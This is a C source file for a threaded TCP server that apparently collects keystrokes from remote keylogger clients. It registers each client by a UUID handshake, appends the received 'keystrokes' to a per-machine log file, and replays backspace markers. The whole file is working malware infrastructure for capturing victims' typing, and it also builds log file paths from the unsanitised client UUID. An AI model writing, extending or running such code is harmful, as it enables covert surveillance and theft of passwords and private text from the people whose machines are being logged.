#include "server.h"

/* Structure containing client connection information, updated to hold UUID metadata */
typedef struct {
    int socket_fd;
    char ip_address[INET_ADDRSTRLEN];
    char uuid[64]; 
} ExtendedClientData;

/* Creates or opens a persistent log file based strictly on the client's unique UUID */
FILE* get_or_create_uuid_log(const char* uuid) {
    struct stat st = {0};
    
    // Check if the central log directory exists, create if missing
    if (stat(LOG_DIR, &st) == -1) {
        if (mkdir(LOG_DIR, 0700) != 0) {
            perror("[-] Failed to create log directory");
            return NULL;
        }
    }

    char filename[256];
    // File named format securely anchored to the unique machine identifier
    snprintf(filename, sizeof(filename), "%s/client_%s.log", LOG_DIR, uuid);

    // Using "a+" mode ensures we safely append if it exists, or create if it doesn't
    FILE *log_file = fopen(filename, "a+");
    if (!log_file) {
        perror("[-] Failed to open or create persistent log file");
        return NULL;
    }
    return log_file;
}

/* Truncates the last character from the file (supporting UTF-8 multi-byte chars) */
void handle_backspace(FILE *log_file) {
    if (!log_file) return;
    fflush(log_file);
    
    off_t size = ftello(log_file);
    if (size <= 0) return;
    
    off_t pos = size - 1;
    int fd = fileno(log_file);
    
    // Step backwards to find the start of the UTF-8 character
    while (pos >= 0) {
        unsigned char c;
        fseeko(log_file, pos, SEEK_SET);
        if (fread(&c, 1, 1, log_file) != 1) break;
        // Break when finding a non-continuation byte (either ASCII or start of UTF-8 multibyte)
        if ((c & 0xC0) != 0x80) break;
        pos--;
    }
    
    if (pos < 0) pos = 0;
    
    // Truncate the file at the identified position
    if (ftruncate(fd, pos) != 0) {
        perror("[-] Failed to truncate file for backspace");
    }
    // Seek back to the end of the newly truncated file
    fseeko(log_file, 0, SEEK_END);
}

/* Thread function to handle incoming client network connections */
void *handle_client(void *arg) {
    ExtendedClientData *client_info = (ExtendedClientData *)arg;
    int client_socket = client_info->socket_fd;
    char client_ip[INET_ADDRSTRLEN];
    strcpy(client_ip, client_info->ip_address);

    char buffer[BUFFER_SIZE];
    FILE *log_file = NULL;

    printf("[+] New connection established from %s\n", client_ip);

    // Phase 1: Authentication/Identity handshake. Expecting "CLIENT_ID:<UUID>"
    memset(buffer, 0, sizeof(buffer));
    ssize_t bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    
    if (bytes_received <= 0) {
        printf("[-] Handshake failed or client disconnected prematurely from %s.\n", client_ip);
        close(client_socket);
        free(client_info);
        pthread_exit(NULL);
    }

    // Verify protocol header format and extract UUID
    if (strncmp(buffer, "CLIENT_ID:", 10) == 0) {
        strncpy(client_info->uuid, buffer + 10, sizeof(client_info->uuid) - 1);
        client_info->uuid[sizeof(client_info->uuid) - 1] = '\0';
        printf("[+] Identity verified for %s. Registered UUID: %s\n", client_ip, client_info->uuid);
    } else {
        printf("[-] Invalid identity handshake from %s. Terminating session.\n", client_ip);
        close(client_socket);
        free(client_info);
        pthread_exit(NULL);
    }

    // Phase 2: Open or create the log file bound to the UUID
    log_file = get_or_create_uuid_log(client_info->uuid);
    if (!log_file) {
        close(client_socket);
        free(client_info);
        pthread_exit(NULL);
    }

    // Free the initialization dynamic allocation tracking data
    free(client_info); 

    // Main reception loop
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        
        // Block and wait for data from the client
        bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        
        if (bytes_received <= 0) {
            printf("[-] Client disconnected from remote stream.\n");
            break;
        }

        // Check if the received data is the specific backspace marker
        if (strcmp(buffer, "[BACKSPACE]") == 0) {
            handle_backspace(log_file);
        } else {
            // Write received keystrokes to the file
            fprintf(log_file, "%s", buffer);
            fflush(log_file); // Flush immediately to ensure data persistence
        }
    }

    fclose(log_file);
    close(client_socket);
    pthread_exit(NULL);
}

int main(void) {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    pthread_t thread;

    // Create a TCP socket for the server
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("[-] Socket creation failed");
        return PROGRAM_FAILURE;
    }

    // Configure socket options to allow immediate reuse of the port
    int opt = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // Configure the server address struct
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY; // Listen on all available interfaces
    server_addr.sin_port = htons(SERVER_PORT);

    // Bind the socket to the specified port
    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Bind failed");
        close(server_socket);
        return PROGRAM_FAILURE;
    }

    // Start listening for incoming connections
    if (listen(server_socket, 5) < 0) {
        perror("[-] Listen failed");
        close(server_socket);
        return PROGRAM_FAILURE;
    }

    printf("[+] Server is listening on port %d...\n", SERVER_PORT);

    // Main server loop to accept connections
    while (1) {
        client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_addr_len);
        if (client_socket < 0) {
            perror("[-] Accept failed");
            continue;
        }

        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);

        // Allocate extended structured memory to hold socket info and identity tracking
        ExtendedClientData *client_info = (ExtendedClientData *)malloc(sizeof(ExtendedClientData));
        if (!client_info) {
             perror("[-] Failed to allocate memory");
             close(client_socket);
             continue;
        }
        client_info->socket_fd = client_socket;
        strcpy(client_info->ip_address, client_ip);
        memset(client_info->uuid, 0, sizeof(client_info->uuid));

        // Spawn a new thread to handle the client connection concurrently
        if (pthread_create(&thread, NULL, handle_client, (void *)client_info) != 0) {
            perror("[-] Failed to create thread");
            free(client_info);
            close(client_socket);
        } else {
            pthread_detach(thread);
        }
    }

    close(server_socket);
    return PROGRAM_SUCCESS;
}